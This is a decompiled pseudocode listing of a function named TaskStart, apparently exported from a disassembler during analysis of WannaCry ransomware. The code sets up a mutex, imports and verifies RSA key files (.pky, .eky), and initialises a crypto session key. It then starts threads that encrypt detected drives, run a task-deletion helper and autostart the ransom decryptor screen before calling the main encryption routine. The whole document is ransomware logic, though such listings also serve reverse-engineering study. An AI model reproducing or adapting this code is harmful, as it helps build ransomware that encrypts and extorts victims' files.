// --- Metadata ---
// Function Name: TaskStart
// Address: 0x10005AE0
// Exported At: 20250522_170650
// Signature: unknown_signature
// ---------------
int __stdcall TaskStart(HMODULE hModule, int a2)
{
  char *v2; // eax
  char *v3; // esi
  HANDLE v4; // eax
  HANDLE v5; // eax
  HANDLE v6; // ebx
  HANDLE v7; // eax
  HANDLE v8; // eax
  HANDLE v10; // esi
  WCHAR Filename; // [esp+10h] [ebp-214h] BYREF
  char v12[516]; // [esp+12h] [ebp-212h] BYREF
  __int16 v13; // [esp+216h] [ebp-Eh]
  int v14; // [esp+220h] [ebp-4h]

  if ( a2 || createMutex_10004690() )
    return 0;
  Filename = word_1000D918;
  memset(v12, 0, sizeof(v12));
  v13 = 0;
  GetModuleFileNameW(hModule, &Filename, 0x103u);
  if ( wcsrchr(&Filename, 0x5Cu) )
    *wcsrchr(&Filename, 0x5Cu) = 0;
  SetCurrentDirectoryW(&Filename);
  if ( !CwnryIO_10001000(&unk_1000D958, 1) )
    return 0;
  dword_1000DD94 = IsRunningAsSystem_100012D0();
  if ( !LoadFileIOAPI_10003410() )
    return 0;
  sprintf(resFile, "%08X.res", 0);
  sprintf(pky_1000DD24, "%08X.pky", 0);
  sprintf(eky_1000DD58, "%08X.eky", 0);
  if ( createMutexAndGrantToEveryone_10004600(0) || importKeyAndVerify_10004500(0) )
  {
    v10 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)autostartWanaDecryptor_10004990, 0, 0, 0);
    WaitForSingleObject(v10, 0xFFFFFFFF);
    CloseHandle(v10);
    return 0;
  }
  v2 = (char *)operator new(0x28u);
  v14 = 0;
  if ( v2 )
    v3 = initObject_10003A10(v2);
  else
    v3 = 0;
  v14 = -1;
  if ( !v3 || !SetupCryptoSessionKey_10003AC0(v3, pky_1000DD24, eky_1000DD58) )
    return 0;
  if ( !Read136bytes_100046D0() || dword_1000DC70 )
  {
    DeleteFileA(resFile);
    memset(&cryptRandom, 0, 0x88u);
    dword_1000DC70 = 0;
    CryptGenRandomWrapper_10004420((HCRYPTPROV *)v3, &cryptRandom, 8u);
  }
  ReleaseCryptoResources_10003BB0(v3);
  (**(void (__thiscall ***)(char *, int))v3)(v3, 1);
  v4 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)writeCryptToResPeriodically_10004790, 0, 0, 0);
  if ( v4 )
    CloseHandle(v4);
  Sleep(0x64u);
  v5 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)WaitForKeyImportAndVerify_100045C0, 0, 0, 0);
  if ( v5 )
    CloseHandle(v5);
  Sleep(0x64u);
  v6 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)DriveDetectionEncryption_10005730, 0, 0, 0);
  Sleep(0x64u);
  v7 = CreateThread(0, 0, RunTaskdl_10005300, 0, 0, 0);
  if ( v7 )
    CloseHandle(v7);
  Sleep(0x64u);
  v8 = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)autostartWanaDecryptor_10004990, 0, 0, 0);
  if ( v8 )
    CloseHandle(v8);
  Sleep(0x64u);
  WannaCryMainRoutine_100057C0();
  if ( v6 )
  {
    WaitForSingleObject(v6, 0xFFFFFFFF);
    CloseHandle(v6);
  }
  return 0;
}
